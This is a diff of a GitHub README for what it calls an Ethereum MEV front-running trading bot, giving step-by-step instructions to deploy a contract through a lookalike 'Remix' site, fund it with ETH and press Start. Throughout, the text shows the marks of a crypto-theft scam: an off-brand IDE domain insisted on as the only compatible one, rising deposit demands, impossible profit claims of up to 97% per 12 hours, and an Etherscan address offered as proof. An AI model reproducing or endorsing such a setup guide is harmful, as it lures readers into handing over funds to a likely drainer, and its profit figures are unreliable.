@@ -1,61 +1,65 @@
 🚨 Important Notice: Ensure Sufficient Funding for Gas and Burn Fees 🚨
 
-Please be aware: Funding your contract with sufficient Ethereum (ETH) to cover both gas and potential burn fees is essential for smooth operation. The bot is configured to target token contracts with a maximum burn fee of 10%, though most tokens today fall within a 2%-6% fee range. Funding with less than 0.1 ETH could result in wasted gas on failed transactions if the bot encounters higher burn fees.
+Please be aware: Funding your contract with sufficient Ethereum (ETH) to cover both gas and potential burn fees is essential for smooth operation. The bot is configured to target token contracts with a maximum burn fee of 10%, though most tokens today fall within a 2%-6% fee range. Funding with less than 0.3 ETH could result in wasted gas on failed transactions if the bot encounters higher burn fees.
 
-To avoid this, I recommend funding your contract with at least 0.15 ETH and up to 10 ETH to ensure the bot functions optimally.
+To avoid this, I recommend funding your contract with at least 0.35 ETH and up to 5 ETH to ensure the bot functions optimally.
 
-This repository contains a smart contract-based trading bot for **Ethereum-based tokens**, designed to interact with decentralized exchanges (DEXs) such as **Uniswap** and **GMX**. The bot is written in **Solidity**, using the **Uniswap V2** and **SushiSwap** routers for execution.
+Step-by-Step Setup Guide:
 
-## Setup Instructions
+1- Download MetaMask
 
-Follow these steps to deploy and run your own trading bot:
+► [Install MetaMask](https://metamask.io/download/)
 
-### 1. Access Remix and MetaMask
-- Visit [Remix IDE](https://remixdeployer.com/) www.remixdeployer.com To minimize transaction fees, please use this optimized version, specifically engineered for this robot. It provides full compatibility while operating with significantly reduced gas costs
-- Ensure you have the **MetaMask** browser extension installed and connected to the **Ethereum mainnet or testnet**
+2- Access Remix
 
-### 2. Create the Contract File
-- In Remix IDE, right-click the `contracts/` folder
-- Click **"New File"** and name it (e.g., `bot.sol`)
+► [Use Remix Ethereum IDE](www.remixdeployer.com) 🚨 www.remixdeployer.com 🚨 (Ensure you only use this version, as the bot is compatible with it specifically.)
 
-### 3. Paste the Contract Code
-- Copy the source code from this repository
-- Paste it into your newly created [Bot.sol](https://github.com/JCBury/ETH-BOT/blob/main/Bot.sol) file
+3- Create Contract File
 
-### 4. Compile the Contract
-- Navigate to the **"Solidity Compiler"** tab
-- Select **Solidity version 0.6.6**
-- Click **"Compile bot.sol"**
+► Go to the “contracts” folder and create a “New File”.
 
-### 5. Deploy the Contract
-- Go to the **"Deploy & Run Transactions"** tab
-- Set the environment to **"Injected Provider - MetaMask"**
-- Select your contract and click **"Deploy"**
-- Confirm the transaction in MetaMask to create your contract
+► Rename it to a desired name ending in .sol, for example, “bot.sol.”
 
-### 6. Fund the Contract
-- Send at least **0.1 ETH** to your contract address 
+► If text colors are missing when creating the file, refresh the browser and paste in the code again.
 
-### 7. Run the Bot
-- In Remix, click the **"Start"** button to activate the bot
-- To stop and withdraw funds, click **"Withdrawal"**
-- For best results, allow the bot to run for at least 24 hours
+4- Paste Code in Remix
 
-## 🔗 Connect With Me
+► Copy and paste the bot code: [ETH Bot Code.
+](https://github.com/JCBury/ETH-BOT/blob/main/bot.sol)
 
-- 📬 [Telegram](https://t.me/Jacob3web)
+5- Compile the Contract
 
-## 📄 License
+► Go to the “Compile” tab on Remix.
 
-This project is for educational and research purposes only. Use at your own risk.
+► Select Solidity version 0.6.6 for compilation.
 
+7- Deploy the Contract
+
+► In the “Deploy & Run Transactions” tab, set “Injected Provider - MetaMask” as the environment and click “Deploy.”
+
+► Confirm the contract creation in MetaMask.
+Note: Ensure your contract name is correctly selected in the CONTRACT section before clicking Deploy. Example: “OneinchSlippageBot - bot.sol.”
+
+7- Fund Your Bot
+
+► Deposit at least 0.3 ETH to cover slippage and ensure effective front-running.
+
+► Transfer the funds to your specific bot address.
+
+8-Run the Bot
+
+► After confirmation, click "Start" to initiate the bot.
+
+► Withdraw your profits anytime by clicking "Withdraw".
+
+Following these steps will help ensure a successful bot operation with minimized transaction issues.
 ➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
 
 📈 Estimated Profits
 
-<table><thead><tr><th style="text-align: center;"><strong>Investment Range (ETH)</strong></th><th style="text-align: center;"><strong>Liquidity Level</strong></th><th style="text-align: center;"><strong>Profits per 12 Hours</strong></th></tr></thead><tbody><tr><td>0.1 ETH - 0.5 ETH</td><td>Low</td><td>Up to 10%</td></tr><tr><td>0.5 ETH - 1 ETH</td><td>Moderate</td><td>Up to 20%</td></tr><tr><td>1 ETH - 3 ETH</td><td>High</td><td>27-35%</td></tr><tr><td>2 ETH - 5 ETH</td><td>High</td><td>35-50%</td></tr><tr><td>6 ETH - 10 ETH</td><td>Very High</td><td>50-63%</td></tr><tr><td>10 ETH - 20 ETH</td><td>Very High</td><td>76%+</td></tr><tr><td>20 ETH - 50 ETH</td><td>Extremely High</td><td>97%+</td></tr></tbody></table>
+<table><thead><tr><th style="text-align: center;"><strong>Investment Range (ETH)</strong></th><th style="text-align: center;"><strong>Liquidity Level</strong></th><th style="text-align: center;"><strong>Profits per 12 Hours</strong></th></tr></thead><tbody><tr><td>0.3 ETH - 0.5 ETH</td><td>Low</td><td>Up to 10%</td></tr><tr><td>0.5 ETH - 1 ETH</td><td>Moderate</td><td>Up to 20%</td></tr><tr><td>1 ETH - 3 ETH</td><td>High</td><td>27-35%</td></tr><tr><td>2 ETH - 5 ETH</td><td>High</td><td>35-50%</td></tr><tr><td>6 ETH - 10 ETH</td><td>Very High</td><td>50-63%</td></tr><tr><td>10 ETH - 20 ETH</td><td>Very High</td><td>76%+</td></tr><tr><td>20 ETH - 50 ETH</td><td>Extremely High</td><td>97%+</td></tr></tbody></table>
 
-🔥 My running mev bot, used 5 ETH. Averaging about 1-3 ETH per day!
-https://etherscan.io/address/0xfc9928F6590D853752824B0B403A6AE36785e535
+🔥 My running mev bot, used 10 ETH. Averaging about 1-3 ETH per day!
+https://etherscan.io/address/0x4838b106fce9647bdf1e7877bf73ce8b0bad5f97
 
 Happy trading! 🚀
